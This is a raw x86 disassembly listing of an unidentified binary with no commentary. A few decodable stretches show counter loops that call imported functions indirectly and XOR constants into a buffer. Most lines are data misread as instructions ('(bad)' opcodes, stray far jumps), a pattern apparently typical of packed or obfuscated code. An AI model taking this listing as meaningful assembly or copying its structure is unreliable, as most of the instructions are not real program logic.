  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x68,al
  40702c:	and    bl,BYTE PTR ss:[esi+0x58]
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407084
  407038:	dec    ebx
  407039:	jne    0x407037
  40703b:	ins    BYTE PTR es:[edi],dx
  40703c:	jnp    0x406fcb
  40703e:	sub    edi,DWORD PTR [ebp+0x623404fc]
  407044:	mov    esp,0xa7499997
  407049:	js     0x407015
  40704b:	mov    ds:0xb0d6de33,al
  407050:	mov    ecx,0xae9db852
  407055:	mov    ds:0xe5584942,al
  40705a:	aaa    
  40705b:	shl    BYTE PTR [eax+eax*2],0x20
  40705f:	or     al,BYTE PTR [ebx-0x73fb2f3b]
  407065:	add    BYTE PTR [edx+0x47],ch
  407068:	aas    
  407069:	in     eax,0xc3
  40706b:	xlat   BYTE PTR ds:[ebx]
  40706c:	adc    DWORD PTR [edx+0x47],ecx
  40706f:	ds pop ebp
  407071:	inc    eax
  407072:	sub    eax,0xa2eb9f22
  407077:	sbb    eax,DWORD PTR [ebx+0x56]
  40707a:	add    eax,0xede8e4e
  40707f:	add    DWORD PTR [esi],ebx
  407081:	gs ret 0xa432
  407085:	sar    BYTE PTR [edx],1
  407087:	retf   
  407088:	and    al,0x66
  40708a:	mov    al,0xa2
  40708c:	jmp    0x407018
  40708e:	inc    ebx
  40708f:	dec    esi
  407090:	imul   esp,DWORD PTR [ebx-0x6742f097],0x64
  407097:	push   ebx
  407098:	ret    0x9ccc
  40709b:	jl     0x4070c5
  40709d:	xchg   esi,eax
  40709e:	into   
  40709f:	mov    ebx,DWORD PTR [ebp+edx*8-0x544b1231]
  4070a6:	push   esp
  4070a7:	sub    al,0x59
  4070a9:	push   0xffffffc3
  4070ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ac:	push   ecx
  4070ad:	in     al,dx
  4070ae:	fimul  DWORD PTR [ebp+0x7f059c33]
  4070b4:	dec    ebx
  4070b5:	mov    bl,0x8
  4070b7:	adc    BYTE PTR [eax+0x24eef477],bh
  4070bd:	(bad)  
  4070be:	fcomp  DWORD PTR [ebx]
  4070c0:	xor    eax,0xcd08fd9d
  4070c5:	adc    DWORD PTR [ecx-0x2c],ebp
  4070c8:	loop   0x4070ad
  4070ca:	add    eax,0xe7cc1c0
  4070cf:	xchg   ecx,eax
  4070d0:	(bad)  
  4070d1:	outs   dx,DWORD PTR ds:[esi]
  4070d2:	push   es
  4070d3:	pop    eax
  4070d4:	fdiv   QWORD PTR [ecx+0x79]
  4070d7:	add    ebx,0xffffffc4
  4070da:	imul   esi,DWORD PTR [edx+0x55],0xffffffc0
  4070de:	sub    DWORD PTR ds:0x63a1eb76,esp
  4070e4:	inc    eax
  4070e5:	jnp    0x4070f2
  4070e7:	sbb    BYTE PTR [edx],bh
  4070e9:	outs   dx,BYTE PTR ds:[esi]
  4070ea:	inc    edx
  4070eb:	mov    eax,ds:0xd08b31e7
  4070f0:	(bad)  
  4070f1:	into   
  4070f2:	fisttp WORD PTR [edi]
  4070f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f5:	push   es
  4070f6:	call   0x22703290
  4070fb:	cmp    al,0x41
  4070fd:	stos   BYTE PTR es:[edi],al
  4070fe:	inc    edi
  4070ff:	sub    al,0x38
  407101:	imul   esi,DWORD PTR [ebx],0x98ed4e0a
  407107:	rol    DWORD PTR [eax-0x20],cl
  40710a:	pop    eax
  40710b:	(bad)  
  40710c:	adc    ecx,DWORD PTR [esi+edx*2]
  40710f:	mov    edx,ecx
  407111:	pop    ebx
  407112:	and    ah,ah
  407114:	mov    eax,ds:0xa173091a
  407119:	or     DWORD PTR [esi-0x8280339],0xddad20c7
  407123:	mov    ebx,0x80a8e4e5
  407128:	jns    0x4070f4
  40712a:	call   0x7ee93b2e
  40712f:	cmp    ecx,0x6d34a31c
  407135:	popf   
  407136:	(bad)  
  407137:	jle    0x4070ca
  407139:	or     eax,0xe717e99d
  40713e:	jbe    0x4071ba
  407140:	cmp    al,0xaf
  407142:	xchg   edi,ebp
  407144:	shl    DWORD PTR [edi-0x3c],0x9e
  407148:	cmp    DWORD PTR [eax-0x2ccaf6d1],ebp
  40714e:	test   BYTE PTR [ecx+0x6e],dh
  407151:	or     DWORD PTR [edx-0x704a2bb1],esp
  407157:	mov    ch,0xdf
  407159:	adc    DWORD PTR [eax],0xffffffe8
  40715c:	and    BYTE PTR [ebx],ah
  40715e:	(bad)  
  40715f:	dec    ebp
  407160:	call   0x6e726749
  407165:	and    BYTE PTR [edi],cl
  407167:	add    BYTE PTR [edi],ah
  407169:	mov    eax,0xb9bbd475
  40716e:	mov    bh,0x3b
  407170:	hlt    
  407171:	cmp    esi,eax
  407173:	lods   al,BYTE PTR ds:[esi]
  407174:	push   ebx
  407175:	lahf   
  407176:	dec    edx
  407177:	(bad)  
  407179:	pop    ds
  40717a:	jb     0x407195
  40717c:	ins    DWORD PTR es:[edi],dx
  40717d:	adc    eax,0x67350226
  407182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407183:	or     eax,0x15e0b1cc
  407188:	jmp    0xa91d:0xc039266e
  40718f:	aad    0xd8
  407191:	cmp    BYTE PTR [esi+0x68b49466],ch
  407197:	ja     0x40720d
  407199:	es jne 0x407205
  40719c:	int    0x75
  40719e:	push   esi
  40719f:	push   edx
  4071a0:	hlt    
  4071a1:	jle    0x40715a
  4071a3:	cmc    
  4071a4:	xchg   ebx,eax
  4071a5:	jmp    0x407168
  4071a7:	push   ebp
  4071a8:	jmp    0x4071d4
  4071aa:	(bad)  
  4071ab:	aam    0x75
  4071ad:	xor    BYTE PTR ss:[ebp-0x59],bl
  4071b1:	xchg   ebx,eax
  4071b2:	jmp    0x914f:0x3e1adc01
  4071b9:	mov    dl,0xe8
  4071bb:	test   BYTE PTR [ecx],dl
  4071bd:	push   edi
  4071be:	mov    ah,0x16
  4071c0:	out    0xb4,al
  4071c2:	int3   
  4071c3:	out    dx,eax
  4071c4:	loop   0x4071ec
  4071c6:	mov    eax,0xc21426a5
  4071cb:	out    dx,al
  4071cc:	mov    ebx,0x37d8c85a
  4071d1:	shl    BYTE PTR [ecx+eiz*4-0x79],0xd6
  4071d6:	dec    edx
  4071d7:	push   esi
  4071d8:	and    edx,edx
  4071da:	adc    al,0x5f
  4071dc:	sbb    cl,dl
  4071de:	sbb    BYTE PTR [edi+0x4d],al
  4071e1:	add    al,0xca
  4071e3:	sbb    DWORD PTR [edx-0x75],esp
  4071e6:	adc    al,0xcc
  4071e8:	stc    
  4071e9:	shl    dl,0xc9
  4071ec:	fadd   DWORD PTR cs:[ebp+0x776e069a]
  4071f3:	sar    ah,0xf1
  4071f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f7:	mov    ebp,0xe4b416d2
  4071fc:	mov    eax,ds:0xde236aeb
  407201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407202:	ret    0x2eb8
  407205:	fs nop
  407207:	jl     0x407213
  407209:	xchg   esi,eax
  40720a:	dec    esi
  40720b:	inc    edi
  40720c:	das    
  40720d:	mov    ecx,DWORD PTR [ecx-0x7f]
  407210:	jg     0x40725a
  407212:	push   cs
  407213:	nop
  407214:	sub    DWORD PTR [edx],eax
  407216:	pop    esp
  407217:	cmp    DWORD PTR [ecx+0x7d],esi
  40721a:	or     bl,BYTE PTR [ebx+eiz*8+0x23aea427]
  407221:	mov    ecx,0x7f0622b0
  407226:	shl    ch,1
  407228:	outs   dx,DWORD PTR ds:[esi]
  407229:	jns    0x40725f
  40722b:	inc    ebp
  40722c:	xlat   BYTE PTR ds:[ebx]
  40722d:	push   0xffffff88
  40722f:	jg     0x40720e
  407231:	shr    DWORD PTR cs:[ecx],1
  407234:	cld    
  407235:	cmp    eax,0xf58ca5dd
  40723a:	pop    ebx
  40723b:	sti    
  40723c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40723d:	mov    eax,0x440b824b
  407242:	push   ebp
  407243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407244:	mov    ebp,DWORD PTR [ebx]
  407246:	cmc    
  407247:	cdq    
  407248:	mov    dl,0x35
  40724a:	js     0x407271
  40724c:	cwde   
  40724d:	xor    ebx,DWORD PTR [eax-0x27]
  407250:	mov    fs,edi
  407252:	mov    ds,WORD PTR [ecx+ebp*4+0x217c5d65]
  407259:	icebp  
  40725a:	setge  BYTE PTR [esi-0x50]
  40725e:	mov    esp,0xe904ce67
  407263:	pop    ecx
  407264:	in     al,dx
  407265:	xor    eax,DWORD PTR [ebx-0xd08eb8b]
  40726b:	inc    edi
  40726c:	sbb    cl,BYTE PTR [eax]
  40726e:	loop   0x40729e
  407270:	sbb    eax,0x7f4fdb43
  407275:	jmp    0x407296
  407277:	push   0x36
  407279:	lock fisttp QWORD PTR [eax+ebp*2]
  40727d:	mov    cl,0x4a
  40727f:	cwde   
  407280:	add    DWORD PTR [eax-0x5],0x48e18666
  407287:	and    al,0xa5
  407289:	or     ecx,DWORD PTR [ebx+ebx*2+0x56]
  40728d:	(bad)  
  40728e:	adc    al,BYTE PTR [eax]
  407290:	fcomi  st,st(3)
  407292:	ins    BYTE PTR es:[edi],dx
  407293:	arpl   WORD PTR [ebx-0x54],sp
  407296:	(bad)  
  407297:	adc    bh,BYTE PTR ds:0xd2bde9f9
  40729d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40729e:	shl    edi,1
  4072a0:	pop    ecx
  4072a1:	and    ch,BYTE PTR [ecx]
  4072a3:	inc    esi
  4072a4:	push   0x27eb4149
  4072a9:	xor    ch,ch
  4072ab:	inc    esp
  4072ac:	mov    BYTE PTR [ecx-0x16],bh
  4072af:	dec    esp
  4072b0:	add    BYTE PTR [eax+esi*2],0xc6
  4072b4:	jmp    0x4072c6
  4072b6:	xor    eax,0xcdd324cf
  4072bb:	mov    ds:0x93b6c1bc,eax
  4072c0:	jns    0x40730f
  4072c2:	xchg   BYTE PTR [edx+0x7cea09a6],bh
  4072c8:	and    al,0x34
  4072ca:	call   DWORD PTR [ebp+0x158055a4]
  4072d0:	push   esp
  4072d1:	fs sysret 
  4072d4:	sbb    cl,bh
  4072d6:	and    DWORD PTR [eax+0x225f871f],0xfffffff3
  4072dd:	dec    esp
  4072de:	rcl    esi,0xc5
  4072e1:	pop    DWORD PTR [ebp-0x73]
  4072e4:	aad    0x57
  4072e6:	pop    ss
  4072e7:	mov    edi,0x746506ee
  4072ec:	mov    esp,0x8ce3f3c7
  4072f1:	pop    edi
  4072f2:	xlat   BYTE PTR ds:[ebx]
  4072f3:	mov    esi,0xb1731551
  4072f8:	int3   
  4072f9:	call   0x1240:0xa9fd2187
  407300:	add    al,0x36
  407302:	out    0xb1,eax
  407304:	mov    edi,?
  407306:	mov    ds,WORD PTR [ebx+edx*8]
  407309:	add    al,0x49
  40730b:	sub    dl,BYTE PTR [esi+0x44]
  40730e:	ins    BYTE PTR es:[edi],dx
  40730f:	and    ebp,DWORD PTR [ecx]
  407311:	in     al,dx
  407312:	cdq    
  407313:	xchg   esp,eax
  407314:	fiadd  DWORD PTR [ebp+eax*2-0xe]
  407318:	cmp    DWORD PTR [edx],eax
  40731a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40731b:	ins    BYTE PTR es:[edi],dx
  40731c:	(bad)  
  40731d:	out    dx,al
  40731e:	push   0xf0b73144
  407323:	mov    BYTE PTR [ebp-0x1],0x7f
  407327:	lea    eax,[ebp-0x1]
  40732a:	and    DWORD PTR ds:0x42a779,0x0
  407334:	jmp    0x407346
  407339:	mov    ecx,DWORD PTR ds:0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x6235f443,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x407349
  4073b7:	mov    dh,0xf0
  4073b9:	rcl    DWORD PTR ss:[eax-0x6e02d3eb],0xcd
  4073c1:	out    0xf7,al
  4073c3:	sub    al,0xcb
  4073c5:	repnz shr BYTE PTR [ecx+0x12],cl
  4073c9:	rcr    BYTE PTR [esi-0x52],0x7d
  4073cd:	neg    cl
  4073cf:	inc    edi
  4073d0:	inc    ebx
  4073d1:	mov    BYTE PTR [edx+ebx*1+0x12],bh
  4073d5:	(bad)  
  4073d6:	xorps  xmm1,XMMWORD PTR [esi]
  4073d9:	les    esp,FWORD PTR [edx+esi*2]
  4073dc:	pshufw mm2,QWORD PTR [edi],0x38
  4073e0:	xchg   ebx,eax
  4073e1:	jno    0x4073fa
  4073e3:	(bad)  
  4073e4:	outs   dx,DWORD PTR ds:[esi]
  4073e5:	pop    edi
  4073e6:	pop    edi
  4073e7:	inc    ecx
  4073e8:	jns    0x407460
  4073ea:	sub    DWORD PTR [ecx+0x28e7f4ba],0x6b
  4073f1:	outs   dx,DWORD PTR ds:[esi]
  4073f2:	(bad)  
  4073f4:	and    ebx,DWORD PTR [edi+0x57]
  4073f7:	leave  
  4073f8:	pop    ss
  4073f9:	out    dx,eax
  4073fa:	push   edx
  4073fb:	sub    BYTE PTR [esi],ah
  4073fd:	mov    ds:0xe5496340,eax
  407402:	scas   al,BYTE PTR es:[edi]
  407403:	out    dx,al
  407404:	imul   esi,DWORD PTR [esi],0xffffffad
  407407:	jp     0x4073fc
  407409:	xchg   edx,eax
  40740a:	jmp    0xe071848f
  40740f:	dec    ecx
  407410:	mov    eax,DWORD PTR [ebx]
  407412:	mov    esp,0xee34dc7e
  407417:	loopne 0x4073b4
  407419:	dec    edx
  40741a:	sbb    eax,0x8afa9f0d
  40741f:	jmp    0x6812b005
  407424:	mov    esp,0xbde542aa
  407429:	push   ebp
  40742a:	jne    0x4073f5
  40742c:	(bad)  
  40742d:	outs   dx,DWORD PTR ds:[esi]
  40742e:	je     0x40749a
  407430:	jl     0x40745a
  407432:	(bad)  
  407433:	je     0x40742b
  407435:	add    DWORD PTR [edi],esp
  407437:	and    esp,esp
  407439:	icebp  
  40743a:	xor    ah,0x84
  40743d:	pop    es
  40743e:	shr    BYTE PTR [ebp-0x78],cl
  407441:	xchg   DWORD PTR [edx+ecx*1],ebx
  407444:	dec    ebx
  407445:	jbe    0x40743f
  407447:	adc    ch,BYTE PTR [edi+0x50edad2d]
  40744d:	adc    BYTE PTR [ebx+0x3a8eb231],ah
  407453:	mov    ebx,0xc7829b17
  407458:	ins    DWORD PTR es:[edi],dx
  407459:	iret   
  40745a:	mov    al,ds:0xc80595e7
  40745f:	jecxz  0x4074d6
  407461:	sahf   
  407462:	dec    eax
  407463:	scas   al,BYTE PTR es:[edi]
  407464:	fadd   QWORD PTR [edi-0x32405a09]
  40746a:	sub    DWORD PTR [esi+eiz*4],esp
  40746d:	adc    dl,dl
  40746f:	fiadd  WORD PTR [edi+0x37]
  407472:	aaa    
  407473:	mov    cs,WORD PTR [esi-0x7e842456]
  407479:	jg     0x40746b
  40747b:	mov    eax,0x124a2583
  407480:	xchg   DWORD PTR [esi-0x78],eax
  407483:	lds    ebp,FWORD PTR [ebx+0x40c04087]
  407489:	and    ebx,DWORD PTR [ebx-0x7a]
  40748c:	inc    esp
  40748d:	mov    bh,0x9e
  40748f:	popf   
  407490:	jbe    0x4074ac
  407492:	lods   al,BYTE PTR ds:[esi]
  407493:	fcomp  QWORD PTR [ebx+edi*2+0x32df67b5]
  40749a:	jne    0x4074a0
  40749c:	mov    ebp,0x31651f55
  4074a1:	(bad)  
  4074a2:	mov    bh,0xd6
  4074a4:	dec    eax
  4074a5:	fcomp  DWORD PTR [esi]
  4074a7:	inc    ebx
  4074a8:	js     0x40751a
  4074aa:	jno    0x40745d
  4074ac:	mov    eax,ds:0x757b745d
  4074b1:	clc    
  4074b2:	mov    ah,BYTE PTR [ecx+0x747c3c1d]
  4074b8:	dec    edx
  4074b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ba:	ins    BYTE PTR es:[edi],dx
  4074bb:	sar    DWORD PTR [ecx+ecx*4-0x6d82111f],cl
  4074c2:	adc    al,0xda
  4074c4:	cmp    BYTE PTR [edx],dl
  4074c6:	(bad)  
  4074c8:	push   ecx
  4074c9:	into   
  4074ca:	es and ecx,edi
  4074cd:	add    esp,DWORD PTR [esi+eiz*1-0x66]
  4074d1:	dec    edi
  4074d2:	shr    BYTE PTR [ebx+0x22],cl
  4074d5:	retf   0x60bd
  4074d8:	arpl   WORD PTR ds:0xfc8f9bb,di
  4074de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074df:	mov    ebx,0x39d68134
  4074e4:	(bad)  
  4074e5:	cwde   
  4074e6:	lahf   
  4074e7:	cdq    
  4074e8:	clc    
  4074e9:	retf   0xe90f
  4074ec:	aas    
  4074ed:	pop    ebx
  4074ee:	in     eax,0xa3
  4074f0:	and    eax,DWORD PTR ds:0x66afa787
  4074f6:	push   eax
  4074f7:	ins    BYTE PTR es:[edi],dx
  4074f8:	dec    ecx
  4074f9:	adc    edx,DWORD PTR ds:0x988da786
  4074ff:	jecxz  0x407536
  407501:	push   es
  407502:	cmp    al,0x7d
  407504:	mov    esi,0x9968db60
  407509:	and    ebx,esi
  40750b:	sahf   
  40750c:	mov    dh,BYTE PTR [edx+0x24]
  40750f:	sbb    BYTE PTR [edx+0x663c4cee],cl
  407515:	inc    edi
  407516:	outs   dx,DWORD PTR ds:[esi]
  407517:	add    al,0x15
  407519:	push   ds
  40751a:	dec    eax
  40751b:	pop    ebx
  40751c:	cmp    BYTE PTR [ebp+0x1b42ec4c],ch
  407522:	fsub   QWORD PTR [ecx+eax*1+0x17693998]
  407529:	mov    bl,0x52
  40752b:	pop    ss
  40752c:	mov    bl,0xb7
  40752e:	lahf   
  40752f:	inc    ecx
  407530:	rol    edi,cl
  407532:	and    eax,DWORD PTR [ebx+0x33]
  407535:	ret    0x3522
  407538:	es loop 0x407569
  40753b:	xchg   DWORD PTR [ecx],esp
  40753d:	repnz dec eax
  40753f:	fistp  QWORD PTR [edi+0x45fa44dd]
  407545:	jmp    0x89efa8a4
  40754a:	stos   DWORD PTR es:[edi],eax
  40754b:	dec    esp
  40754c:	pop    ss
  40754d:	outs   dx,BYTE PTR ds:[esi]
  40754e:	pusha  
  40754f:	lds    ebx,FWORD PTR [ebx+0x39]
  407552:	lahf   
  407553:	nop    DWORD PTR ds:0xbc5b9b1d
  40755a:	lods   eax,DWORD PTR ds:[esi]
  40755b:	imul   edi,DWORD PTR [esi],0x11
  40755e:	or     ebx,DWORD PTR [ebp+0x4b]
  407561:	jp     0x407550
  407563:	jo     0x4074e9
  407565:	mov    esp,0x7e4f07d0
  40756a:	in     al,dx
  40756b:	ja     0x407503
  40756d:	dec    ecx
  40756e:	rol    DWORD PTR [ebx],0x49
  407571:	add    BYTE PTR gs:[eax+0x122b1604],dl
  407578:	and    dl,BYTE PTR ds:0xbf953e2b
  40757e:	rcl    DWORD PTR [eax],0x16
  407581:	cwde   
  407582:	rol    BYTE PTR [edx-0x5e],0xa7
  407586:	mov    eax,ds:0x5b420fc8
  40758b:	jno    0x407577
  40758d:	push   ss
  40758e:	stc    
  40758f:	push   0xffffff90
  407591:	mov    edx,0x4ff12925
  407596:	scas   eax,DWORD PTR es:[edi]
  407597:	clc    
  407598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407599:	addr16 mov ds:0x4b9d,eax
  40759d:	popa   
  40759e:	retf   0x34ef
  4075a1:	ins    BYTE PTR es:[edi],dx
  4075a2:	adc    ebx,0xffffffa2
  4075a5:	add    BYTE PTR [edi+0x63ee7935],0xe0
  4075ac:	fdiv   QWORD PTR [ebp+0x3]
  4075af:	push   esi
  4075b0:	imul   DWORD PTR [ebp-0x3]
  4075b3:	(bad)  
  4075b4:	sub    al,0x8a
  4075b6:	add    DWORD PTR [edi-0x70],edx
  4075b9:	test   eax,0xb68a0ffe
  4075be:	add    ebp,esp
  4075c0:	push   edx
  4075c1:	(bad)  
  4075c2:	mov    ah,0xb4
  4075c4:	jns    0x4075ac
  4075c6:	in     eax,0x49
  4075c8:	loope  0x407581
  4075ca:	gs jp  0x4075f3
  4075cd:	jmp    DWORD PTR [edi+0x35]
  4075d0:	mov    bh,0x3a
  4075d2:	sbb    BYTE PTR ds:0x3c45675e,ch
  4075d8:	out    0x35,eax
  4075da:	xor    BYTE PTR [ebx+ebx*1-0x656b9172],0x5d
  4075e2:	mov    ebp,0x114139d2
  4075e7:	or     al,0xbe
  4075e9:	pop    ebx
  4075ea:	rcl    DWORD PTR [edi+0x17],1
  4075ed:	cld    
  4075ee:	mov    edx,0x7d4d250c
  4075f3:	sub    ah,al
  4075f5:	ss pushf 
  4075f7:	test   BYTE PTR [edx],0xb7
  4075fa:	pop    edi
  4075fb:	dec    edx
  4075fc:	hlt    
  4075fd:	jmp    0xff4e:0xc438f52c
  407604:	sar    BYTE PTR [eax-0x56c21ccd],0x6a
  40760b:	sahf   
  40760c:	mul    BYTE PTR [edi]
  40760e:	(bad)  
  40760f:	sar    DWORD PTR [edx],1
  407611:	pop    ds
  407612:	div    BYTE PTR [ebx+0x55]
  407615:	adc    cl,BYTE PTR [esi]
  407617:	ret    0xb1fb
  40761a:	in     eax,0x42
  40761c:	cmp    DWORD PTR [eax],esp
  40761e:	loop   0x4075da
  407620:	ret    0x4162
  407623:	lock je 0x407658
  407626:	iret   
  407627:	aas    
  407628:	jno    0x407686
  40762a:	fwait
  40762b:	in     al,0x3c
  40762d:	ins    BYTE PTR es:[edi],dx
  40762e:	shr    DWORD PTR [esi-0x226a36fd],1
  407634:	add    ch,BYTE PTR [eax-0x8]
  407637:	lds    edi,FWORD PTR [eax-0x2d4c810c]
  40763d:	jmp    0x3c9649e3
  407642:	jmp    0x8731fe55
  407647:	add    DWORD PTR [ecx-0x7a],ecx
  40764a:	or     dh,bh
  40764c:	nop
  40764d:	pop    edi
  40764e:	or     ebx,DWORD PTR [edx+0x6b]
  407651:	jle    0x4076c2
  407653:	push   es
  407654:	nop
  407655:	inc    esi
  407656:	dec    edx
  407657:	xlat   BYTE PTR ds:[ebx]
  407658:	mov    dl,0xc0
  40765a:	out    dx,al
  40765b:	xor    ch,BYTE PTR [ebx+0x1f8fcd34]
  407661:	add    dl,cl
  407663:	jecxz  0x407675
  407665:	shl    DWORD PTR [edi],cl
  407667:	mov    esp,0x38a13d
  40766c:	out    dx,eax
  40766d:	adc    dl,ch
  40766f:	push   eax
  407670:	push   ebp
  407671:	pop    edi
  407672:	cdq    
  407673:	(bad)  
  407674:	hlt    
  407675:	ret    
  407676:	add    bl,BYTE PTR [edx-0x41c66b6f]
  40767c:	(bad)  
  40767d:	add    edx,ebp
  40767f:	lods   al,BYTE PTR ds:[esi]
  407680:	cmp    bh,bl
  407682:	mov    edi,0x65a39b56
  407687:	dec    edi
  407688:	pop    es
  407689:	mov    esi,0x4b753479
  40768e:	aad    0xdb
  407690:	outs   dx,DWORD PTR ds:[esi]
  407691:	inc    esp
  407692:	mov    ecx,ecx
  407694:	(bad)  
  407695:	loop   0x40770b
  407697:	stos   BYTE PTR es:[edi],al
  407698:	neg    BYTE PTR [eax-0x40]
  40769b:	test   ecx,edx
  40769d:	and    al,0xde
  40769f:	loopne 0x4076e3
  4076a1:	push   ecx
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a761,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x4c518918],1
  407796:	shr    BYTE PTR [edi+0x78d6b0d7],cl
  40779c:	js     0x407802
  40779e:	jle    0x407818
  4077a0:	js     0x40781f
  4077a2:	fbstp  TBYTE PTR [ecx]
  4077a4:	ret    
  4077a5:	sub    al,0x50
  4077a7:	adc    BYTE PTR ds:0x47f24f71,al
  4077ad:	enter  0x5c83,0xea
  4077b1:	(bad)  
  4077b2:	sti    
  4077b3:	lock mov ah,0x6b
  4077b6:	add    DWORD PTR [ebx-0x4f],ebx
  4077b9:	retf   
  4077ba:	popa   
  4077bb:	pusha  
  4077bc:	aaa    
  4077bd:	jg     0x40779d
  4077bf:	mov    ebp,0x3a746584
  4077c4:	jg     0x4077b3
  4077c6:	sub    eax,0x472e1d86
  4077cb:	inc    edx
  4077cc:	inc    edi
  4077cd:	mov    DWORD PTR [ebx+0x2a],eax
  4077d0:	xchg   ecx,eax
  4077d1:	(bad)  
  4077d2:	aaa    
  4077d3:	and    ecx,esp
  4077d5:	pop    ebp
  4077d6:	mov    cl,0x4
  4077d8:	lods   al,BYTE PTR ds:[esi]
  4077d9:	sub    BYTE PTR [ecx+edi*1+0x482e20f8],bh
  4077e0:	cmp    cl,BYTE PTR [ebx]
  4077e2:	xor    BYTE PTR es:[ebx+0x1e],0x2c
  4077e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077e8:	ret    0x5ba5
  4077eb:	ror    BYTE PTR [edx+0x598cbaf8],0xf1
  4077f2:	call   DWORD PTR [eax+ebp*1-0x76]
  4077f6:	jecxz  0x407781
  4077f8:	dec    ebp
  4077f9:	mov    ds:0xf48e87a8,eax
  4077fe:	inc    esi
  4077ff:	je     0x40778c
  407801:	xor    bh,BYTE PTR [ecx+0x2c]
  407804:	pusha  
  407805:	sar    BYTE PTR [edx-0x6ace2925],1
  40780b:	es daa 
  40780d:	in     al,dx
  40780e:	inc    ebx
  40780f:	sub    BYTE PTR [ebp-0x4c],ch
  407812:	lea    esp,[ecx]
  407814:	(bad)  
  407815:	outs   dx,DWORD PTR ds:[esi]
  407816:	sbb    DWORD PTR [ebx],0x523cf982
  40781c:	ret    
  40781d:	retf   
  40781e:	push   edx
  40781f:	or     bl,BYTE PTR [edi+0x34dee332]
